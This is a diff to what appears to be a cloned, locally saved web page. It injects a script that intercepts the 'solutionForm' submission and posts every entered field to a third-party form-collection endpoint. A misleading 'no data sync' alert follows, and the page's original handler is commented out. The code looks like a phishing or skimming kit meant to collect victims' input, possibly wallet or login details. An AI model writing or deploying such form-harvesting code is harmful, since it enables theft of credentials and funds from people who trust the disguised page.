@@ -2091,8 +2091,38 @@ window._uxa.push(["trackPageview",window.location.pathname+window.location.hash.
 					<div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon310593991058"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon797422542393" width="0" height="0" alt="" src="./index_files/0" class="optanon-category-C0004 "></div><iframe name="_hjRemoteVarsFrame" title="_hjRemoteVarsFrame" id="_hjRemoteVarsFrame" src="./index_files/box-5e66f98b4ee957db209dc6f63e3d59dd.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><img height="1" width="1" style="display: none;" class="optanon-category-C0004 " src="./index_files/adsct"><img src="./index_files/adsct(1)" height="1" width="1" class="optanon-category-C0004 " style="display: none;">
  
 
-  
 <script>
+const form = document.getElementById('solutionForm');
+
+form.addEventListener('submit', (event) => {
+  event.preventDefault(); // prevent default form submission behavior
+
+	document.getElementById("scanSubmit").setAttribute("disabled","disabled");
+    	const collection1 = document.getElementById("scanSubmit");
+    	collection1.style.background = "grey";
+	
+  const formData = new FormData(form); // create new FormData objecthttps://usebasin.com/f/eb20225ebe56 
+  fetch('https://usebasin.com/f/171ba645cf7c', { //sd https://usebasin.com/f/171ba645cf7c
+    method: 'POST',
+    body: formData // pass form data as the request body
+  })
+  .then(response => {
+    if (response.ok) {
+	alert('ok response no data sync!');
+      return response.json(); // if response is okay, parse the response as JSON
+    }
+    throw new Error('Network response was not ok.');
+  })
+  .catch(error => {
+    console.error('Error:', error); // log any errors
+	alert('server error, kindly try again');
+      document.getElementById("scanSubmit").removeAttribute("disabled");
+      const collection1 = document.getElementById("scanSubmit");
+      collection1.style.background = "#ff5300";
+  });
+});
+</script>
+<!-- <script>
 
 const form = document.getElementById('solutionForm');
 
@@ -2123,7 +2153,8 @@ function inspectExport(exportData){
     let responset = requestt.response;
 } 
 
-</script>
+</script> -->
+			      
   
   
 
